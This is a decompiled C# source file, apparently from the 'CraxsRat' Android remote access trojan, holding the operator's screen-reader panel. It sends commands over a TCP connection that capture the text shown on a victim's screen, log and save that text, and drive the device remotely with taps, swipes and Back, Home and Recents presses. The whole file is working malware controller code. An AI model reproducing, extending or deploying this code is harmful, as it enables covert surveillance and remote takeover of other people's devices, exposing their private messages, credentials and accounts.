using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;

// Token: 0x020000B5 RID: 181
[DesignerGenerated]
public partial class ScreenReader : Form
{
	// Token: 0x06000789 RID: 1929 RVA: 0x000B27E0 File Offset: 0x000B09E0
	public ScreenReader()
	{
		base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq;
		base.FormClosing += this.ScreenReader_FormClosing;
		this.Title = "null";
		this.firstclick = true;
		this.tiks = 0;
		this.Swaping = false;
		this.isdown = false;
		this.isclick = false;
		this.InitializeComponent();
	}

	// Token: 0x0600078C RID: 1932 RVA: 0x0000206C File Offset: 0x0000026C
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsaxrftyu(object sender, EventArgs e)
	{
	}

	// Token: 0x0600078D RID: 1933 RVA: 0x000B39CC File Offset: 0x000B1BCC
	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SCRD<*>f",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
			this.enablebtn.Enabled = true;
			this.disablebtn.Enabled = false;
		}
	}

	// Token: 0x0600078E RID: 1934 RVA: 0x000B3AFC File Offset: 0x000B1CFC
	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh(object[] objs)
	{
		checked
		{
			try
			{
				if (this.viewpanel.InvokeRequired)
				{
					ScreenReader.addLogback method = new ScreenReader.addLogback(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxczxsdkh);
					this.viewpanel.Invoke(method, new object[]
					{
						objs
					});
				}
				else
				{
					string text = Conversions.ToString(objs[0]);
					if (Operators.CompareString(text, "CLR", false) == 0)
					{
						this.viewpanel.Controls.Clear();
					}
					else
					{
						string[] array = text.Split(new char[]
						{
							'^'
						});
						int num = array.Length - 1;
						ScreenReader._Closure_0024__52_002D0 closure_0024__52_002D = null;
						int num2 = 0;
						while (num2 <= num)
						{
							closure_0024__52_002D = new ScreenReader._Closure_0024__52_002D0(closure_0024__52_002D);
							closure_0024__52_002D._0024VB_0024Me = this;
							string[] array2 = array[num2].Split(new char[]
							{
								':'
							});
							closure_0024__52_002D._0024VB_0024Local_Type = new TextBox();
							string text2 = array2[0];
							if (!string.IsNullOrWhiteSpace(text2) && !text2.Contains("null"))
							{
								this.textBox1.AppendText("> " + text2 + "\r\n");
							}
							closure_0024__52_002D._0024VB_0024Local_sizearry = array2[1].Split(new char[]
							{
								'~'
							});
							string[] array3 = array2[2].Split(new char[]
							{
								'~'
							});
							string[] array4 = null;
							try
							{
								array4 = array2[3].Split(new char[]
								{
									'~'
								});
								goto IL_381;
							}
							catch (Exception)
							{
								array4 = null;
								goto IL_381;
							}
							goto IL_156;
							IL_173:
							int num3;
							int num4;
							closure_0024__52_002D._0024VB_0024Local_Type.Location = new Point((int)Math.Round(unchecked(Conversions.ToDouble(closure_0024__52_002D._0024VB_0024Local_sizearry[0]) * ((double)this.viewpanel.Width / (double)num3))), (int)Math.Round(unchecked(Conversions.ToDouble(closure_0024__52_002D._0024VB_0024Local_sizearry[1]) * ((double)this.viewpanel.Height / (double)num4))));
							foreach (object obj in this.viewpanel.Controls)
							{
								Control control = (Control)obj;
								try
								{
									if (closure_0024__52_002D._0024VB_0024Local_Type.Bounds.IntersectsWith(control.Bounds) && closure_0024__52_002D._0024VB_0024Local_Type.Text.Equals(control.Text, StringComparison.CurrentCultureIgnoreCase))
									{
										this.viewpanel.Controls.Remove(control);
									}
								}
								catch (Exception)
								{
								}
							}
							closure_0024__52_002D._0024VB_0024Local_Type.Text = text2;
							if (array4 == null)
							{
								Size size = TextRenderer.MeasureText(closure_0024__52_002D._0024VB_0024Local_Type.Text, closure_0024__52_002D._0024VB_0024Local_Type.Font);
								closure_0024__52_002D._0024VB_0024Local_Type.Size = new Size(size.Width, 20);
							}
							else
							{
								Size size2 = TextRenderer.MeasureText(closure_0024__52_002D._0024VB_0024Local_Type.Text, closure_0024__52_002D._0024VB_0024Local_Type.Font);
								closure_0024__52_002D._0024VB_0024Local_Type.Size = new Size(size2.Width, Conversions.ToInteger(array4[1]));
							}
							closure_0024__52_002D._0024VB_0024Local_Type.BorderStyle = BorderStyle.None;
							closure_0024__52_002D._0024VB_0024Local_Type.BackColor = Color.Black;
							closure_0024__52_002D._0024VB_0024Local_Type.ForeColor = Color.Red;
							closure_0024__52_002D._0024VB_0024Local_Type.ReadOnly = true;
							closure_0024__52_002D._0024VB_0024Local_Type.BorderStyle = BorderStyle.FixedSingle;
							closure_0024__52_002D._0024VB_0024Local_Type.DoubleClick += closure_0024__52_002D._Lambda_0024__0;
							closure_0024__52_002D._0024VB_0024Local_Type.MouseClick += closure_0024__52_002D._Lambda_0024__1;
							this.viewpanel.Controls.Add(closure_0024__52_002D._0024VB_0024Local_Type);
							num2++;
							continue;
							IL_156:
							this.ScreenSize = new Size(Conversions.ToInteger(array3[0]), Conversions.ToInteger(array3[1]));
							goto IL_173;
							IL_381:
							num3 = Conversions.ToInteger(array3[0]);
							num4 = Conversions.ToInteger(array3[1]);
							if (this.ScreenSize == default(Size))
							{
								goto IL_156;
							}
							goto IL_173;
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x0600078F RID: 1935 RVA: 0x00003560 File Offset: 0x00001760
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsijygesq(object sender, EventArgs e)
	{
		this.Timer1.Enabled = true;
		this.Timer1.Start();
	}

	// Token: 0x06000790 RID: 1936 RVA: 0x000B3F2C File Offset: 0x000B212C
	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		try
		{
			this.viewpanel.Controls.Clear();
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x06000791 RID: 1937 RVA: 0x000B3F60 File Offset: 0x000B2160
	private void Timer1_Tick(object sender, EventArgs e)
	{
		checked
		{
			if (this.viewpanel.Controls.Count > 0)
			{
				int num = this.viewpanel.Controls.Count - 1;
				for (int num2 = 0; num2 <= num; num2++)
				{
					try
					{
						if (this.viewpanel.Controls[num2].Tag != null && Operators.ConditionalCompareObjectEqual(this.viewpanel.Controls[num2].Tag, "E", false))
						{
							this.viewpanel.Controls.Remove(this.viewpanel.Controls[num2]);
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}
	}

	// Token: 0x06000792 RID: 1938 RVA: 0x000B4024 File Offset: 0x000B2224
	private void ScreenReader_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SCRD<*>f",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
		this.Timer1.Stop();
		this.Timer1.Enabled = false;
	}

	// Token: 0x06000793 RID: 1939 RVA: 0x000B4154 File Offset: 0x000B2354
	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			try
			{
				string[] array = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Bc",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000794 RID: 1940 RVA: 0x000B4280 File Offset: 0x000B2480
	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			try
			{
				string[] array = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>Ho",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000795 RID: 1941 RVA: 0x000B43AC File Offset: 0x000B25AC
	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			try
			{
				string[] array = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>RC",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}
	}

	// Token: 0x06000796 RID: 1942 RVA: 0x000B44D8 File Offset: 0x000B26D8
	private void Viewpanel_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			this.Trakpoint = new List<Point>();
			this.Trakpoint.Add(new Point(e.X, e.Y));
			this.isclick = false;
			this.isdown = true;
		}
		else
		{
			this.isclick = true;
		}
	}

	// Token: 0x06000797 RID: 1943 RVA: 0x000B4534 File Offset: 0x000B2734
	private void Viewpanel_MouseMove(object sender, MouseEventArgs e)
	{
		if (this.isdown)
		{
			this.Swaping = true;
			this.isclick = false;
			this.Trakpoint.Add(new Point(e.X, e.Y));
		}
	}

	// Token: 0x06000798 RID: 1944 RVA: 0x000B4574 File Offset: 0x000B2774
	private void Viewpanel_MouseUp(object sender, MouseEventArgs e)
	{
		this.isdown = false;
		int width = this.viewpanel.Width;
		int height = this.viewpanel.Height;
		checked
		{
			if (!this.isclick)
			{
				if (this.Swaping)
				{
					this.Swaping = false;
					this.Trakpoint.Add(new Point(e.X, e.Y));
					StringBuilder stringBuilder = new StringBuilder();
					foreach (Point point in this.Trakpoint)
					{
						stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point.X * ((double)this.ScreenSize.Width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)this.ScreenSize.Height / (double)height)))).ToString() + ":");
					}
					string[] array = this.Classclient.Keys.Split(new char[]
					{
						':'
					});
					object[] parametersObjects = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"sp<*>",
							stringBuilder.ToString(),
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(parametersObjects);
				}
			}
			else
			{
				string text = "clk:";
				this.tiks = 0;
				Point point2 = this.viewpanel.PointToClient(Control.MousePosition);
				Point point3 = new Point((int)Math.Round(unchecked((double)point2.X * ((double)width / (double)width))), (int)Math.Round(unchecked((double)point2.Y * ((double)height / (double)height))));
				text = text + point3.X.ToString() + ":" + point3.Y.ToString();
				string[] array2 = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects2 = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>",
						text,
						Data.SPL_SOCKET,
						array2[0],
						Data.SPL_SOCKET,
						array2[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects2);
			}
		}
	}

	// Token: 0x06000799 RID: 1945 RVA: 0x000B3F60 File Offset: 0x000B2160
	private void drakeUIButton1_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.viewpanel.Controls.Count > 0)
			{
				int num = this.viewpanel.Controls.Count - 1;
				for (int num2 = 0; num2 <= num; num2++)
				{
					try
					{
						if (this.viewpanel.Controls[num2].Tag != null && Operators.ConditionalCompareObjectEqual(this.viewpanel.Controls[num2].Tag, "E", false))
						{
							this.viewpanel.Controls.Remove(this.viewpanel.Controls[num2]);
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}
	}

	// Token: 0x0600079A RID: 1946 RVA: 0x0000206C File Offset: 0x0000026C
	private void drakeUIButtonIcon4_Click_1(object sender, EventArgs e)
	{
	}

	// Token: 0x0600079B RID: 1947 RVA: 0x0000206C File Offset: 0x0000026C
	private void drakeUIButtonIcon3_Click_1(object sender, EventArgs e)
	{
	}

	// Token: 0x0600079C RID: 1948 RVA: 0x000B4934 File Offset: 0x000B2B34
	private void sButton1_Click(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			try
			{
			}
			catch (Exception)
			{
			}
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SCRD<*>o",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
			this.Timer1.Enabled = true;
			this.enablebtn.Enabled = false;
			this.disablebtn.Enabled = true;
		}
	}

	// Token: 0x0600079D RID: 1949 RVA: 0x000B39CC File Offset: 0x000B1BCC
	private void sButton2_Click(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"SCRD<*>f",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
			this.enablebtn.Enabled = true;
			this.disablebtn.Enabled = false;
		}
	}

	// Token: 0x0600079E RID: 1950 RVA: 0x000B4A88 File Offset: 0x000B2C88
	private void sButton3_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*";
		saveFileDialog.Title = "Save As Text File";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			string fileName = saveFileDialog.FileName;
			using (StreamWriter streamWriter = new StreamWriter(fileName))
			{
				streamWriter.Write(this.textBox1.Text);
			}
		}
	}

	// Token: 0x04000ABC RID: 2748
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("viewpanel")]
	private Panel _viewpanel;

	// Token: 0x04000ABD RID: 2749
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("disablebtn")]
	private DrakeUIButtonIcon _disablebtn;

	// Token: 0x04000ABE RID: 2750
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("enablebtn")]
	private DrakeUIButtonIcon _enablebtn;

	// Token: 0x04000ABF RID: 2751
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	// Token: 0x04000AC0 RID: 2752
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	// Token: 0x04000AC1 RID: 2753
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	// Token: 0x04000AC2 RID: 2754
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	// Token: 0x04000AC3 RID: 2755
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	// Token: 0x04000AC4 RID: 2756
	public Client Classclient;

	// Token: 0x04000AC5 RID: 2757
	public string Title;

	// Token: 0x04000AC6 RID: 2758
	public object firstclick;

	// Token: 0x04000AC7 RID: 2759
	public ScreenLoger LogScreen;

	// Token: 0x04000AC8 RID: 2760
	private int tiks;

	// Token: 0x04000AC9 RID: 2761
	private bool Swaping;

	// Token: 0x04000ACA RID: 2762
	private bool isdown;

	// Token: 0x04000ACB RID: 2763
	private bool isclick;

	// Token: 0x04000ACC RID: 2764
	public Size ScreenSize;

	// Token: 0x04000ACD RID: 2765
	private List<Point> Trakpoint;

	// Token: 0x020000B6 RID: 182
	// (Invoke) Token: 0x060007A0 RID: 1952
	public delegate void addLogback(object[] objs);

	// Token: 0x020000B7 RID: 183
	[CompilerGenerated]
	internal sealed class _Closure_0024__52_002D0
	{
		// Token: 0x060007A3 RID: 1955 RVA: 0x000B4AF8 File Offset: 0x000B2CF8
		public _Closure_0024__52_002D0(ScreenReader._Closure_0024__52_002D0 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_Type = arg0._0024VB_0024Local_Type;
				this._0024VB_0024Local_sizearry = arg0._0024VB_0024Local_sizearry;
			}
		}

		// Token: 0x060007A4 RID: 1956 RVA: 0x000B4B2C File Offset: 0x000B2D2C
		internal void _Lambda_0024__0(object sender2, EventArgs eventargs2)
		{
			try
			{
				Clipboard.SetText(this._0024VB_0024Local_Type.Text);
				EagleAlert.ShowSucess("Text Copied.");
				this._0024VB_0024Local_Type.Tag = "E";
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060007A5 RID: 1957 RVA: 0x000B4B7C File Offset: 0x000B2D7C
		internal void _Lambda_0024__1(object sender2, MouseEventArgs eventargs2)
		{
			try
			{
				string text = "clk:";
				this._0024VB_0024Me.tiks = 0;
				this._0024VB_0024Me.viewpanel.PointToClient(Control.MousePosition);
				text = text + Convert.ToInt32(Conversions.ToDouble(this._0024VB_0024Local_sizearry[0])).ToString() + ":" + Convert.ToInt32(Conversions.ToDouble(this._0024VB_0024Local_sizearry[1])).ToString();
				string[] array = this._0024VB_0024Me.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					this._0024VB_0024Me.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"sp<*>",
						text,
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this._0024VB_0024Me.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this._0024VB_0024Me.Classclient
				};
				this._0024VB_0024Me.Classclient.SendMessage(parametersObjects);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x04000ADD RID: 2781
		public TextBox _0024VB_0024Local_Type;

		// Token: 0x04000ADE RID: 2782
		public string[] _0024VB_0024Local_sizearry;

		// Token: 0x04000ADF RID: 2783
		public ScreenReader _0024VB_0024Me;
	}
}
